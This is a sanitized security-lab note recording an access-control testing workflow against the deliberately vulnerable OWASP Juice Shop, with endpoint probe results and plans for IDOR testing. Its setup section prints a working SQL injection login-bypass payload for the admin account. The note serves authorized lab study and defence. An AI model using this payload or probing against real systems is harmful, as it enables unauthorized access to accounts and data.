> Public sanitized edition: sensitive personal, target, path, IP, alias, advisory, and run-specific evidence fields are redacted. This repository does not authorize live testing.

# valuable_candidate_auth_access_boundary_expansion

Status: valuable-candidate / partial verified access-control workflow
Date: 2026-05-22
Route/tool: Windows Hermes control plane -> SSH/SCP -> `<attacker-vm>` -> authorized Juice Shop victim
Artifact root: `<artifact-output-dir>/kali_intel_wave3_20260522T005554Z/`
Sources mapped: CISA KEV/NVD auth bypass and access-control patterns; OWASP A01/A07; CWE-287/CWE-862/CWE-863
Related verified bundle: `verified_lab_flow_sqli_auth_bypass_admin_users_read.md`

## Why keep this bundle

This extends the already verified SQLi auth-bypass chain into a reusable access-control boundary workflow. Not every endpoint becomes a new finding, but comparing unauthenticated and authenticated behavior is valuable and repeatable.

## Setup

SQLi login was replayed from Kali:

```text
POST /rest/user/login
email = admin@juice-sh.op'--
password = vf3
```

Result:

```text
HTTP 200
token_present=true
```

## Boundary probes

```text
/api/Users                              unauth=401 auth=200
/rest/admin/application-configuration   unauth=200 auth=200
/rest/basket/1                          unauth=401 auth=200
/api/BasketItems                        unauth=401 auth=200
```

## Verification decision

- `/api/Users` remains verified as protected data read after SQLi-derived admin session.
- `/rest/admin/application-configuration` remains verified unauthenticated config exposure.
- `/rest/basket/1` and `/api/BasketItems` are useful access-control workflow leads, but not yet standalone vulnerabilities without low-privilege/user-ownership comparison or abusive state change.

## Value retained

- Captures unauth vs admin-auth differential behavior.
- Identifies endpoints for future IDOR/object-ownership testing.
- Keeps the access-control work connected to KEV/NVD patterns without overclaiming.

## Next steps

- Create two non-admin lab users and compare object ownership behavior.
- Try basket-item create/update/delete with own basket vs other basket IDs.
- If the current target cannot demonstrate IDOR cleanly, add a dedicated vulnerable API/IDOR lab target.
